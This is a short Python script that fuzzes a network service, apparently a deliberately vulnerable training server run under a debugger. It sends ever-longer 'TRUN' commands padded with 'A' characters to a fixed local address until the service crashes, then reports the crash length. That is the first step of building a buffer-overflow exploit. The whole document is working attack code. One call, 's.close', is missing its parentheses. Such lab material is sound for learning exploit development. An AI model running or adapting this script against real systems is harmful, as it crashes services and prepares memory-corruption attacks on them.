#!/usr/bin/python3
import sys, socket
from time import sleep

# This script will create a socket and send the buffer of As to that socket until it crashes (you have to ctrl + c) to see the answer.
# The vulnerable app is running and attached to immunity debugger

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.38',9999))
        payload = 'TRUN /.:/' + buffer
        s.send((payload.encode()))
        s.close
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
